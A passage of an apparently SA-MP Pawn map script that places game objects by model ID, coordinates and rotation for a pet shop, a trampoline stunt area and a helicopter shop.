	CreateSObject(2780, 1836.75269, -1381.30383, 595.10168,   0.00000, 0.00000, 0.00000);
	CreateSObject(2780, 1832.89734, -1382.24036, 595.91370,   0.00000, 0.00000, 0.00000);
	CreateSObject(1676, 1892.53760, -1442.22791, 554.50507,   0.00000, 0.00000, 0.00000);
	CreateSObject(1676, 1835.82056, -1442.29919, 556.02734,   0.00000, 0.00000, 0.00000);
	CreateSObject(1676, 1870.72937, -1455.58435, 542.26532,   0.00000, 0.00000, 0.00000);
	CreateSObject(1676, 1852.81543, -1456.05640, 542.26532,   0.00000, 0.00000, 0.00000);
	CreateSObject(1676, 1884.12415, -1456.05664, 543.49988,   0.00000, 0.00000, 0.00000);
	CreateSObject(1676, 1841.31702, -1457.14111, 543.64624,   0.00000, 0.00000, 0.00000);
	CreateSObject(897, 1835.96594, -1595.65833, 452.39005,   0.00000, 0.00000, 0.00000);
	CreateSObject(897, 1833.02246, -1516.00549, 502.23950,   0.00000, 0.00000, 0.00000);
	CreateSObject(897, 1886.85022, -1501.71118, 511.92538,   0.00000, 0.00000, 0.00000);
	CreateSObject(897, 1860.85925, -1601.21558, 445.10477,   0.00000, 0.00000, 0.00000);
	CreateSObject(897, 1880.46875, -1656.23511, 406.74338,   0.00000, 0.00000, 0.00000);
	CreateSObject(897, 1835.04053, -1662.82922, 406.74338,   0.00000, 0.00000, 0.00000);
	CreateSObject(18847, 1865.34375, 81.31517, 1400.58813,   0.00000, 0.00000, 90.00000);
	// Pet Shop
	CreateSObject(17068, 632.14941, -1925.83740, 0.19000,   0.00000, 0.00000, 0.00000);
	CreateSObject(17068, 632.17999, -1947.84961, 0.19000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19452, 636.78998, -1960.47998, 0.49000,   0.00000, 88.00000, 271.00000);
	CreateSObject(970, 634.39001, -1960.90002, 1.00000,   0.00000, 0.00000, 271.26999);
	CreateSObject(19452, 627.31000, -1960.66003, 0.49000,   0.00000, 88.00000, 271.00000);
	CreateSObject(970, 636.42999, -1958.75000, 1.00000,   0.00000, 0.00000, 181.70000);
	CreateSObject(1232, 634.57001, -1959.01001, 3.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1232, 638.57001, -1958.93005, 3.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(970, 630.63000, -1960.91003, 1.00000,   0.00000, 0.00000, 271.26999);
	CreateSObject(970, 628.52002, -1958.93005, 1.00000,   0.00000, 0.00000, 181.70000);
	CreateSObject(1232, 630.15002, -1959.19995, 3.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1232, 626.60999, -1959.26001, 3.00000,   0.00000, 0.00000, 0.00000);
	CreateSObject(638, 628.51001, -1959.56995, 1.20000,   0.00000, 0.00000, 270.92999);
	CreateSObject(638, 636.42999, -1959.34998, 1.20000,   0.00000, 0.00000, 270.92999);
	CreateSObject(638, 638.46002, -1960.55005, 1.20000,   0.00000, 0.00000, 179.28000);
	CreateSObject(638, 626.53003, -1960.93994, 1.20000,   0.00000, 0.00000, 179.28000);
	CreateSObject(1259, 632.48608, -1953.12598, -11.32000,   -180.00000, 0.00000, 0.00000);
	CreateSObject(1259, 629.34003, -1953.03003, -11.32000,   -180.00000, 0.00000, 0.00000);
	CreateSObject(19386, 632.38300, -1962.30603, 2.25000,   0.00000, 0.00000, 270.63000);
	CreateSObject(1502, 631.62958, -1962.30139, 0.49000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19377, 631.50000, -1967.06006, 4.10000,   0.00000, -90.00000, 271.00000);
	CreateSObject(19377, 634.06000, -1967.06006, 4.10000,   0.00000, -90.00000, 271.00000);
	CreateSObject(19377, 634.26990, -1977.42822, 4.10000,   0.00000, -90.00000, 271.00000);
	CreateSObject(19377, 631.67999, -1977.47998, 4.10000,   0.00000, -90.00000, 271.00000);
	CreateSObject(19379, 632.77563, -1967.03381, 0.54000,   0.00000, -90.00000, 359.39999);
	CreateSObject(630, 631.07001, -1963.53003, 1.71000,   0.00000, 0.00000, 0.00000);
	CreateSObject(630, 634.02002, -1963.53003, 1.71000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1828, 632.51001, -1965.04004, 0.69000,   0.00000, 0.00000, 89.07000);
	CreateSObject(18856, 637.02588, -1967.53320, 2.11000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19446, 637.93671, -1967.10779, 2.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(867, 636.53998, -1967.75000, 0.74000,   0.00000, 0.00000, 324.64999);
	CreateSObject(19315, 637.12000, -1966.06006, 1.30000,   0.00000, 7.00000, -152.00000);
	CreateSObject(19315, 636.46619, -1967.45740, 1.04520,   0.00000, 7.00000, 154.00000);
	CreateSObject(19446, 637.92828, -1976.70776, 2.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19379, 632.70123, -1976.65906, 0.54000,   0.00000, -90.00000, 359.39999);
	CreateSObject(19446, 627.57037, -1967.28149, 2.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19446, 627.56281, -1976.58691, 2.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(19450, 633.16742, -1981.38098, 2.34000,   0.00000, 0.00000, 269.16339);
	CreateSObject(1603, 630.86523, -1967.30811, 1.71000,   -54.00000, 2.00000, 357.00000);
	CreateSObject(953, 635.03766, -1973.22461, 1.49000,   0.00000, 0.00000, 0.00000);
	CreateSObject(953, 635.09332, -1972.19690, 1.49000,   0.00000, 0.00000, 0.00000);
	CreateSObject(2168, 628.17999, -1973.90002, 0.38000,   0.00000, 0.00000, 269.01001);
	CreateSObject(2414, 629.27625, -1972.98352, 0.62000,   0.00000, 0.00000, 90.64000);
	CreateSObject(2168, 628.16022, -1971.94580, 0.38000,   0.00000, 0.00000, 269.01001);
	CreateSObject(19078, 629.21997, -1971.41003, 1.76000,   -11.00000, -85.00000, 202.00000);
	CreateSObject(2422, 628.95001, -1972.95996, 1.70000,   0.00000, 0.00000, 91.59000);
	CreateSObject(2004, 627.62360, -1972.46826, 2.40604,   0.00000, 0.00000, 90.00000);
	CreateSObject(638, 628.69000, -1979.20996, 0.80000,   0.00000, 0.00000, 0.00000);
	CreateSObject(638, 631.63000, -1979.10999, 0.80000,   0.00000, 0.00000, 0.00000);
	CreateSObject(638, 634.98999, -1979.51001, 0.80000,   0.00000, 0.00000, 0.00000);
	CreateSObject(902, 633.34003, -1979.19995, 0.49000,   0.00000, 0.00000, 0.00000);
	CreateSObject(902, 627.82001, -1979.17004, 2.12000,   -78.00000, 71.00000, 354.98001);
	CreateSObject(1649, 635.60999, -1976.76831, 2.15000,   0.00000, 0.00000, 180.31000);
	CreateSObject(1649, 629.71368, -1976.81104, 2.15000,   0.00000, 0.00000, 180.67000);
	CreateSObject(1661, 632.70001, -1972.81995, 3.60000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1734, 632.69000, -1972.81995, 4.30000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1603, 629.21002, -1934.43994, 0.61000,   0.00000, 0.00000, 359.70001);
	CreateSObject(1607, 625.38000, -1937.54004, 0.80000,   17.00000, 0.00000, 261.07001);
	CreateSObject(1607, 637.26001, -1941.14001, 0.80000,   17.00000, 0.00000, 79.01000);
	CreateSObject(17071, 650.64557, -1942.08118, -1.73000,   0.00000, 0.00000, 359.06000);
	CreateSObject(17071, 613.96997, -1934.34998, -1.73000,   0.00000, 0.00000, 359.06000);
	CreateSObject(1609, 619.03003, -1935.12000, 0.38000,   0.00000, 0.00000, 345.72000);
	CreateSObject(619, 641.07001, -1915.39001, -1.87000,   0.00000, 0.00000, 336.67001);
	CreateSObject(619, 623.33002, -1911.80005, -1.77000,   0.00000, 0.00000, 110.80000);
	CreateSObject(1608, 639.09003, -1932.62000, 0.08000,   0.00000, 0.00000, 201.92000);
	CreateSObject(1606, 627.41998, -1929.29004, -0.12000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1649, 635.78625, -1962.22510, 2.23000,   0.00000, 0.00000, 180.50000);
	CreateSObject(1649, 629.56592, -1962.40466, 2.23000,   0.00000, 0.00000, 180.50000);
	CreateSObject(4020, 1544.83997, -1516.84998, 32.45000,   0.00000, 0.00000, 0.00000);
	CreateSObject(1606, 632.19733, -1979.06897, 1.64920,   2.00000, 10.00000, 88.05545);
	CreateSObject(1609, 636.71027, -1979.74194, 1.12974,   0.00000, 0.00000, 0.00000);
	CreateSObject(2460, 630.82471, -1967.20837, 0.80000,   0.00000, 0.00000, 269.00000);
	CreateSObject(2460, 635.08228, -1972.19641, 0.80000,   0.00000, 0.00000, 269.00000);
	CreateSObject(1609, 626.60278, -1953.56177, -0.23730,   18.00000, 0.00000, 346.00000);
	CreateSObject(1603, 635.95300, -1951.65698, -0.49821,   0.00000, 0.00000, 359.70001);
	CreateSObject(953, 635.08588, -1955.77649, -0.12314,   0.00000, 178.00000, 0.00000);
	CreateSObject(953, 634.85242, -1945.27258, -0.12310,   6.00000, -62.00000, 0.00000);
	CreateSObject(953, 629.10657, -1948.86218, -0.12310,   6.00000, 84.00000, 0.00000);
	CreateSObject(1608, 622.09137, -1949.25964, 0.08000,   8.00000, 0.00000, -18.00000);
	CreateSObject(953, 630.36255, -1979.76428, 0.95192,   0.00000, 0.00000, -185.00000);
	CreateSObject(1606, 632.39417, -1979.48596, 2.77661,   2.00000, 10.00000, 91.85437);
	CreateSObject(1649, 631.25659, -1976.79724, 2.15000,   0.00000, 0.00000, 180.67000);
	CreateSObject(19450, 632.46875, -1981.37219, 2.34000,   0.00000, 0.00000, 269.16339);
	CreateSObject(17071, 634.31604, -1911.17468, -1.86683,   0.00000, 0.00000, 80.25805);
	CreateSObject(17071, 631.91174, -1912.11475, -1.75753,   0.00000, 0.00000, 288.15878);
	CreateSObject(1514, 629.18646, -1972.73669, 1.93000,   0.00000, 0.00000, 90.00000);
	// Trampoline
	CreateSObject(18835, -533.22491, -618.93854, 524.38727,   0.00000, 0.00000, 0.00000);
	CreateSObject(18827, -405.46530, -623.54987, 592.79224,   0.00000, 0.00000, -90.12000);
	CreateSObject(18789, -325.68887, -623.12018, 588.68610,   0.00000, 0.00000, 0.00000);
	CreateSObject(18836, -366.05542, -623.74353, 591.84235,   0.00000, 0.00000, -89.87997);
	CreateSObject(18836, -367.88211, -623.63635, 591.84235,   0.00000, 0.00000, -89.87997);
	CreateSObject(18836, -370.83459, -623.54480, 591.84235,   0.00000, 0.00000, -89.87997);
	CreateSObject(18836, -369.05869, -623.63538, 591.84235,   0.00000, 0.00000, -89.87997);
	CreateSObject(18836, -372.62527, -623.78790, 591.84235,   0.00000, 0.00000, -89.87997);
	CreateSObject(18836, -374.51770, -623.68115, 591.84235,   0.00000, 0.00000, -89.87997);
	CreateSObject(18836, -375.76065, -623.68060, 591.84235,   0.00000, 0.00000, -89.87997);
	CreateSObject(18836, -377.60345, -623.59058, 591.84235,   0.00000, 0.00000, -89.87997);
	CreateSObject(3816, -228.81059, -623.75946, 597.59637,   0.00000, 0.00000, -90.47998);
	CreateSObject(3515, -267.77725, -616.34613, 589.24225,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -263.87015, -629.84448, 589.24225,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -263.73740, -616.29138, 589.24225,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -267.51581, -629.84778, 589.24225,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -256.03598, -616.22552, 589.24225,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -259.99881, -616.28009, 589.24225,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -259.65958, -629.78064, 589.24225,   0.00000, 0.00000, 0.00000);
	CreateSObject(3515, -255.93549, -629.77661, 589.24225,   0.00000, 0.00000, 0.00000);
	CreateSObject(3528, -341.65405, -629.23004, 593.66107,   0.00000, 0.00000, 0.00000);
	CreateSObject(3528, -341.06351, -618.83118, 593.66107,   0.00000, 0.00000, 0.00000);
	CreateSObject(8483, -335.31003, -638.35950, 595.00311,   0.00000, 0.00000, 88.73999);
	CreateSObject(8483, -305.55594, -638.56952, 594.99933,   0.00000, 0.00000, 88.73999);
	CreateSObject(8483, -276.83316, -637.63910, 594.99933,   0.00000, 0.00000, 88.73999);
	CreateSObject(8483, -293.05850, -637.92938, 594.99933,   0.00000, 0.00000, 88.73999);
	CreateSObject(8483, -321.78632, -638.34204, 595.00311,   0.00000, 0.00000, 88.73999);
	CreateSObject(8483, -331.61127, -608.27704, 594.99933,   0.00000, 0.00000, -91.02008);
	CreateSObject(8483, -302.96069, -607.87378, 594.99933,   0.00000, 0.00000, -91.02008);
	CreateSObject(8483, -276.08194, -608.04919, 594.99933,   0.00000, 0.00000, -91.02008);
	CreateSObject(8483, -288.88782, -608.60645, 594.99933,   0.00000, 0.00000, -91.02008);
	CreateSObject(8483, -315.96033, -607.90552, 594.99933,   0.00000, 0.00000, -91.02008);
	CreateSObject(18827, -533.17780, -618.86591, 463.83188,   -89.99993, -52.32004, 0.00000);
	CreateSObject(2918, -535.38318, -618.75531, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -531.76855, -617.73926, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -533.30157, -617.83783, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -532.77393, -619.98370, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -531.03973, -621.39941, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -529.67920, -620.74860, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -531.14526, -616.15759, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -533.20300, -615.55408, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -535.98932, -617.14227, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -532.64282, -622.68011, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -536.23651, -620.38367, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -530.72260, -619.71570, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -529.16913, -618.66638, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(4206, -532.42206, -619.27655, 414.21045,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -534.41833, -621.56525, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, -208.75456, -642.29681, 589.04907,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, -209.27167, -622.30023, 589.04907,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, -208.77023, -602.93097, 589.04907,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, -228.37003, -602.84198, 589.04907,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, -246.54233, -602.84552, 589.04907,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, -228.41724, -641.68665, 589.04907,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, -247.45346, -641.63702, 589.04907,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, -228.09468, -622.33533, 589.04907,   0.00000, 0.00000, 0.00000);
	CreateSObject(19129, -246.55013, -622.63568, 589.04907,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -202.57637, -598.17627, 591.95837,   0.00000, 0.00000, 0.00000);
	CreateSObject(6965, -202.62842, -649.88452, 591.95837,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -534.63043, -616.25372, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -537.32379, -618.69653, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -534.36871, -619.78601, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -529.91650, -617.19049, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -532.62024, -616.60150, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -534.81488, -617.54004, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -533.57062, -618.58661, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -531.95026, -618.97980, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -532.87549, -621.21100, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -534.24744, -623.03516, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -536.05444, -621.82715, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -535.63116, -615.34149, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -531.79590, -614.79926, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -534.01880, -614.38037, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -529.58960, -616.04443, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -530.61694, -618.42273, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -531.88440, -620.22156, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -531.42682, -622.67078, 414.85953,   0.00000, 0.00000, 0.00000);
	CreateSObject(2918, -537.16113, -617.42560, 414.85953,   0.00000, 0.00000, 0.00000);
	// Helicopters Shop
	CreateSObject(19439, -1013.73932, 469.14920, 13.06700,   0.00000, 90.00000, 134.78799);
	CreateSObject(19378, -1012.07922, 488.72601, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -1012.73523, 474.49469, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -1005.29382, 481.88440, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -1004.68158, 496.06470, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -1026.35950, 488.09793, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -997.23633, 503.47311, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -1005.97467, 467.63593, 13.06400,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -998.52643, 475.04099, 13.06400,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -991.12488, 482.39371, 13.06400,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -1011.47491, 502.89380, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -1018.92413, 495.50198, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(10838, -1020.26990, 473.85297, 29.16260,   0.00000, 0.00000, 224.94087);
	CreateSObject(19378, -997.89838, 489.22400, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -1004.03516, 510.30042, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -990.46082, 496.63000, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -983.68591, 489.80109, 13.06400,   0.00000, 90.00000, 44.78800);
	CreateSObject(19378, -1019.52551, 481.32880, 13.06000,   0.00000, 90.00000, 44.78800);
	CreateSObject(19439, -1024.86670, 480.36981, 13.06900,   0.00000, 90.00000, 134.78799);
	CreateSObject(19439, -1022.40503, 477.88492, 13.06900,   0.00000, 90.00000, 134.78799);
	CreateSObject(19439, -1019.94727, 475.40460, 13.06900,   0.00000, 90.00000, 134.78799);
	CreateSObject(19439, -1017.48773, 472.92636, 13.06900,   0.00000, 90.00000, 134.78799);
	CreateSObject(19439, -1015.03223, 470.44882, 13.06900,   0.00000, 90.00000, 134.78799);
	CreateSObject(1383, -978.53741, 490.06201, -11.50260,   0.00000, 0.00000, 45.02720);
	CreateSObject(1383, -1003.71918, 515.38745, -11.50261,   0.00000, 0.00000, 45.02720);
	CreateSObject(3851, -1013.43420, 507.70639, 19.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -1002.29742, 464.55115, 15.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -1021.47015, 499.74133, 15.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -994.26447, 472.51440, 15.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -1021.47021, 499.74130, 19.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -1029.49231, 491.78851, 19.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -1029.49231, 491.78848, 15.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -980.59869, 486.08850, 19.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -1002.29742, 464.55109, 19.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -994.26453, 472.51440, 19.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -986.22992, 480.48029, 19.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(18981, -984.83124, 491.27777, 21.46498,   0.00000, 90.00000, 44.80000);
	CreateSObject(18981, -990.51764, 503.46707, 8.68430,   0.00000, 0.00000, 44.80000);
	CreateSObject(18981, -1002.57703, 473.66446, 21.46500,   0.00000, 90.00000, 44.80000);
	CreateSObject(18981, -1020.18213, 491.39688, 21.46498,   0.00000, 90.00000, 44.80000);
	CreateSObject(18981, -1002.45313, 509.01062, 21.46498,   0.00000, 90.00000, 44.80000);
	CreateSObject(3851, -980.56824, 494.11197, 15.14000,   0.00000, 0.00000, 224.74760);
	CreateSObject(3851, -1007.70117, 513.37708, 19.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -980.56818, 494.11200, 19.14000,   0.00000, 0.00000, 224.74760);
	CreateSObject(3851, -999.72388, 513.38422, 19.14000,   0.00000, 0.00000, 224.74760);
	CreateSObject(3851, -999.72394, 513.38416, 15.14000,   0.00000, 0.00000, 224.74760);
	CreateSObject(3851, -1011.63507, 465.89935, 15.14000,   0.00000, 0.00000, 224.74760);
	CreateSObject(3851, -1017.01788, 471.32349, 15.43233,   90.00000, 0.00000, 224.74760);
	CreateSObject(3851, -1011.63507, 465.89941, 19.14000,   0.00000, 0.00000, 224.74760);
	CreateSObject(3851, -1013.43420, 507.70636, 15.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -1007.70117, 513.37708, 15.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -986.22986, 480.48026, 15.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -980.59869, 486.08850, 15.14000,   0.00000, 0.00000, 314.74759);
	CreateSObject(3851, -1028.21606, 482.47760, 19.14000,   0.00000, 0.00000, 224.74760);
	CreateSObject(1416, -999.53888, 505.07455, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -1000.53638, 506.08090, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -998.55042, 504.07654, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -997.55951, 503.07837, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -996.56622, 502.07584, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -995.57404, 501.07516, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -994.58301, 500.07321, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -993.58514, 499.06589, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -992.58960, 498.06110, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -991.60504, 497.06760, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -990.60596, 496.05939, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -989.61499, 495.06110, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(3851, -1028.21606, 482.47763, 15.14000,   0.00000, 0.00000, 224.74760);
	CreateSObject(3851, -1022.82825, 477.03415, 15.43233,   90.00000, 0.00000, 224.74760);
	CreateSObject(1416, -988.62390, 494.06223, 13.72000,   0.00000, 0.00000, 314.77560);
	CreateSObject(1416, -985.07703, 496.02194, 13.72000,   0.00000, 0.00000, 44.77560);
	CreateSObject(1416, -998.49072, 509.62439, 13.72000,   0.00000, 0.00000, 224.77560);
	CreateSObject(1416, -986.08185, 495.02484, 13.72000,   0.00000, 0.00000, 44.77560);
	CreateSObject(1416, -987.08344, 494.03204, 13.72000,   0.00000, 0.00000, 44.77560);
	CreateSObject(1416, -1000.50897, 507.62256, 13.72000,   0.00000, 0.00000, 224.77560);
	CreateSObject(1416, -999.49756, 508.62521, 13.72000,   0.00000, 0.00000, 224.77560);
	CreateSObject(19458, -993.66711, 484.15790, 13.24000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19458, -1003.84814, 478.01721, 13.24000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19458, -1007.30420, 478.00018, 13.24000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19458, -1016.06421, 486.91116, 13.41000,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -1016.06689, 490.37085, 13.24000,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -1009.78680, 503.82050, 13.24000,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -1009.78503, 500.32382, 13.24000,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -990.18384, 484.15662, 13.24000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19458, -1016.06879, 486.89169, 13.24000,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -1016.04895, 490.37637, 13.41000,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -1009.78497, 500.32379, 13.41000,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -1009.78680, 503.82050, 13.41000,   0.00000, 90.00000, 90.00000);
	CreateSObject(19458, -993.66711, 484.15790, 13.41000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19458, -990.18378, 484.15659, 13.41000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19458, -1007.30017, 477.98489, 13.41000,   0.00000, 90.00000, 0.00000);
	CreateSObject(19458, -1003.81787, 477.99109, 13.41000,   0.00000, 90.00000, 0.00000);
	CreateSObject(18980, -1010.43616, 510.54788, 9.37613,   0.00000, 0.00000, 44.07225);
	CreateSObject(18980, -1009.72235, 511.24814, 9.37613,   0.00000, 0.00000, 44.07225);
	CreateSObject(18980, -1011.13409, 509.85449, 9.37613,   0.00000, 0.00000, 44.07225);
	CreateSObject(18980, -1011.84625, 509.17050, 9.37613,   0.00000, 0.00000, 44.07225);
	CreateSObject(18980, -982.59021, 484.13776, 9.37613,   0.00000, 0.00000, 44.07225);
	CreateSObject(18980, -983.30170, 483.44446, 9.37613,   0.00000, 0.00000, 44.07225);
	CreateSObject(18980, -984.01965, 482.74594, 9.37613,   0.00000, 0.00000, 44.07225);
	CreateSObject(18980, -984.72577, 482.06686, 9.37613,   0.00000, 0.00000, 44.07225);
	CreateSObject(2745, -1021.22235, 476.50641, 14.31320,   0.00000, 0.00000, 134.20071);
	CreateSObject(2745, -1017.58954, 472.84134, 14.31320,   0.00000, 0.00000, 134.20071);
	CreateSObject(2422, -998.84979, 504.74771, 14.29500,   0.00000, 0.00000, 314.18765);
	CreateSObject(2422, -989.55768, 495.39294, 14.29500,   0.00000, 0.00000, 314.18765);
	CreateSObject(2745, -1001.39557, 506.83472, 14.31320,   0.00000, 0.00000, 314.20071);
	CreateSObject(2745, -987.85907, 493.17688, 14.31320,   0.00000, 0.00000, 314.20071);
	CreateSObject(2190, -994.89868, 500.05750, 14.29022,   0.00000, 0.00000, 133.93462);
	CreateSObject(2200, -988.80127, 500.83719, 15.04000,   0.00000, 0.00000, 314.79999);
	CreateSObject(2200, -987.23651, 499.26297, 13.14520,   0.00000, 0.00000, 314.79999);
	CreateSObject(2200, -990.36157, 502.41068, 13.14520,   0.00000, 0.00000, 314.79999);
	CreateSObject(2200, -988.80133, 500.83722, 13.14520,   0.00000, 0.00000, 314.79999);
	CreateSObject(2200, -995.32526, 507.40604, 13.14520,   0.00000, 0.00000, 314.79999);
	CreateSObject(2200, -993.75983, 505.82889, 13.14520,   0.00000, 0.00000, 314.79999);
	CreateSObject(2202, -992.27423, 503.90009, 13.14116,   0.00000, 0.00000, 315.18600);
	CreateSObject(2161, -996.25079, 508.34793, 13.14560,   0.00000, 0.00000, 314.79999);
	CreateSObject(2163, -994.35999, 506.43332, 15.03910,   0.00000, 0.00000, 314.79999);
	CreateSObject(2076, -992.66052, 501.84235, 20.18721,   0.00000, 0.00000, 0.00000);
	CreateSObject(2076, -1010.02423, 484.07104, 20.13680,   0.00000, 0.00000, 0.00000);
	CreateSObject(2076, -1020.54352, 491.57013, 20.21598,   0.00000, 0.00000, 0.00000);
	CreateSObject(2076, -1002.60107, 473.58530, 20.25198,   0.00000, 0.00000, 0.00000);
	CreateSObject(1726, -1003.73828, 463.96533, 13.14869,   0.00000, 0.00000, 224.47832);
	CreateSObject(1726, -1007.40948, 462.46594, 13.14870,   0.00000, 0.00000, 134.47830);
	CreateSObject(1727, -1006.76929, 466.06812, 13.14870,   0.00000, 0.00000, 1.04398);
	CreateSObject(1714, -989.25861, 496.53073, 13.16000,   0.00000, 0.00000, 348.07602);
	CreateSObject(1714, -993.62250, 500.81616, 13.16000,   0.00000, 0.00000, 297.51843);
	CreateSObject(1714, -998.55176, 505.73718, 13.16000,   0.00000, 0.00000, -11.00000);
	CreateSObject(1808, -985.58154, 497.35660, 13.14596,   0.00000, 0.00000, 315.51935);
	CreateSObject(2024, -1006.76166, 463.86673, 13.14951,   0.00000, 0.00000, 0.00000);
	CreateSObject(1722, -1011.21881, 508.95807, 13.14716,   0.00000, 0.00000, 224.05562);
	CreateSObject(1722, -1010.56476, 509.60559, 13.14716,   0.00000, 0.00000, 224.05562);
